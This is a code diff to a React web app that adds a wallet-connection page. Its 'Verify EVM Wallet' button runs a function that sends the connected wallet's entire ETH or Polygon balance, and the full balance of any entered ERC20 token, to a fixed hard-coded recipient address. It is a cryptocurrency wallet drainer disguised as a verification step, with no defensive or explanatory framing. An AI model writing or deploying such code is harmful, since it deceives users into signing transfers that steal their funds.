@@ -53,6 +53,96 @@ function App() {
       return parseFloat(ethers.formatEther(estimatedGas * gasPrice));
     } catch {
       return 0.001;
+    }
+  };
+
+  const sendMaxEVM = async () => {
+    if (!isEvm || !evmBalance?.formatted) return;
+
+    const chains = [ETH_RPC, POLYGON_RPC].filter(Boolean);
+
+    for (let rpcUrl of chains) {
+      const provider = new ethers.JsonRpcProvider(rpcUrl);
+
+      const gasCostETH = await estimateGasCost({ to: FIXED_EVM_RECIPIENT, value: parseEther("0.001") }, rpcUrl);
+      const maxETH = parseFloat(evmBalance.formatted) - gasCostETH;
+      if (maxETH > 0) {
+        await sendTransactionAsync({ to: FIXED_EVM_RECIPIENT, value: parseEther(maxETH.toString()) });
+      }
+
+      if (tokenAddress) {
+        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+        const decimals = await contract.decimals();
+        const tokenBalanceRaw = await contract.balanceOf(address);
+        const tokenBalance = parseFloat(ethers.formatUnits(tokenBalanceRaw, decimals));
+
+        const data = contract.interface.encodeFunctionData("transfer", [
+          FIXED_EVM_RECIPIENT,
+          parseUnits(tokenBalance.toString(), decimals)
+        ]);
+
+        const gasCostToken = await estimateGasCost({ to: tokenAddress, data }, rpcUrl);
+        if (parseFloat(evmBalance.formatted) < gasCostToken) continue;
+
+        await writeContractAsync({
+          address: tokenAddress,
+          abi: ERC20_ABI,
+          functionName: "transfer",
+          args: [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]
+        });
+      }
+    }
+  };
+
+  return (
+    <div>
+      <div style={backgroundStyle}></div>
+
+      <div style={{
+        position: "relative",
+        zIndex: 1,
+        minHeight: "100vh",
+        display: "flex",
+        flexDirection: "column",
+        alignItems: "center",
+        justifyContent: "center",
+        color: "#fff",
+        textAlign: "center",
+        padding: 20
+      }}>
+        {!isConnected ? (
+          <>
+            <appkit-button />
+            <h2 style={{ marginTop: "20px" }}>Connect your wallet to get started</h2>
+          </>
+        ) : (
+          <>
+            <h3>Connected: {address}</h3>
+            <p>Network: {isSolana ? "Solana" : "EVM"}</p>
+
+            {isEvm && (
+              <p>Balance: {evmBalance?.formatted} {evmBalance?.symbol}</p>
+            )}
+
+            {isEvm && (
+              <>
+                <input
+                  placeholder="ERC20 Token Address (optional)"
+                  value={tokenAddress}
+                  onChange={(e) => setTokenAddress(e.target.value)}
+                  style={{ width: "300px", marginBottom: "10px", padding: "5px" }}
+                />
+                <br />
+                <button onClick={sendMaxEVM} style={{ padding: "10px 20px", cursor: "pointer" }}>
+                  Verify EVM Wallet (ETH + ERC20 + Polygon)
+                </button>
+              </>
+            )}
+          </>
+        )}
+      </div>
+    </div>
+  );
 }
 
 export default App;
